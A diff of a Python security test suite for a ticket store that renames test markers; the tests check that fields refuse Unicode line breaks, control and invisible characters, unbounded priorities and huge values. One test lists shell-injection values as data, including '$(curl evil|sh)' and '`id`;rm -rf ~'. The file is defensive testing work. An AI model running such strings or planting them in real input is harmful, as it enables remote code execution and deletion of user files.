@@ -7,7 +7,6 @@ from __future__ import annotations
 
 import pytest
 
-from tests.security.support import bug, design
 from tkt_store.domain.operations import (
     AddOp,
     CancelOp,
@@ -96,25 +95,33 @@ def cases(chars: dict[str, str], fields: dict[str, Op]) -> list[object]:
     ]
 
 
-@bug("Unicode line breaks pass validation and forge trailer lines (rules.py CONTROL_CHARS_RE)")
+@pytest.mark.security_bug(
+    "Unicode line breaks pass validation and forge trailer lines (rules.py CONTROL_CHARS_RE)"
+)
 @pytest.mark.parametrize(("field", "char"), cases(LINE_BREAKS, text_ops("x")))
 def test_unicode_line_breaks_are_refused_in_free_text(field: str, char: str) -> None:
     assert refused_invalid(text_ops(char)[field])
 
 
-@bug("C1 controls (U+0080-U+009F) pass the control-character check; U+0085 is a line break")
+@pytest.mark.security_bug(
+    "C1 controls (U+0080-U+009F) pass the control-character check; U+0085 is a line break"
+)
 @pytest.mark.parametrize(("field", "char"), cases(C1_CONTROLS, text_ops("x")))
 def test_c1_controls_are_refused_in_free_text(field: str, char: str) -> None:
     assert refused_invalid(text_ops(char)[field])
 
 
-@bug("C1 controls pass the control-character check (the whole range, in a title)")
+@pytest.mark.security_bug(
+    "C1 controls pass the control-character check (the whole range, in a title)"
+)
 def test_the_whole_c1_range_is_refused() -> None:
     accepted = [hex(c) for c in range(0x80, 0xA0) if not refused_invalid(AddOp(T1, chr(c)))]
     assert accepted == []
 
 
-@design("bidi, zero-width and Unicode tag characters are accepted in agent, reason and title")
+@pytest.mark.security_design(
+    "bidi, zero-width and Unicode tag characters are accepted in agent, reason and title"
+)
 @pytest.mark.parametrize(("field", "char"), cases(INVISIBLE, text_ops("x")))
 def test_invisible_characters_are_refused_in_free_text(field: str, char: str) -> None:
     assert refused_invalid(text_ops(char)[field])
@@ -123,20 +130,26 @@ def test_invisible_characters_are_refused_in_free_text(field: str, char: str) ->
 CONTROL_LIKE = {"newline": "\n", "ESC": "\x1b", **LINE_BREAKS, **C1_CONTROLS, **INVISIBLE}
 
 
-@design("project and tags are never validated: controls and invisible characters pass")
+@pytest.mark.security_design(
+    "project and tags are never validated: controls and invisible characters pass"
+)
 @pytest.mark.parametrize(("field", "char"), cases(CONTROL_LIKE, opaque_ops("x")))
 def test_project_and_tags_refuse_control_and_invisible_characters(field: str, char: str) -> None:
     assert refused_invalid(opaque_ops(f"a{char}b")[field])
 
 
-@design("policy: project and tags are free text; should shell metacharacters be refused?")
+@pytest.mark.security_design(
+    "policy: project and tags are free text; should shell metacharacters be refused?"
+)
 @pytest.mark.parametrize("value", ["$(curl evil|sh)", "`id`;rm -rf ~", "a'b\"c"])
 @pytest.mark.parametrize("field", ["project", "tag"])
 def test_project_and_tags_refuse_shell_metacharacters(field: str, value: str) -> None:
     assert refused_invalid(opaque_ops(value)[field])
 
 
-@design("priority is unbounded: a huge negative priority wins every claim-next")
+@pytest.mark.security_design(
+    "priority is unbounded: a huge negative priority wins every claim-next"
+)
 @pytest.mark.parametrize("priority", [-(10**12), 10**12])
 def test_priority_is_bounded(priority: int) -> None:
     assert refused_invalid(AddOp(T1, "Fix tests", priority=priority))
@@ -148,7 +161,9 @@ BIG = 100_000
 MANY_BLOCKERS = tuple(TicketId(f"tkt-{n:x}") for n in range(10_000))
 
 
-@design("no size limits: huge values flood every reader's context and every commit trailer")
+@pytest.mark.security_design(
+    "no size limits: huge values flood every reader's context and every commit trailer"
+)
 @pytest.mark.parametrize(
     "op",
     [
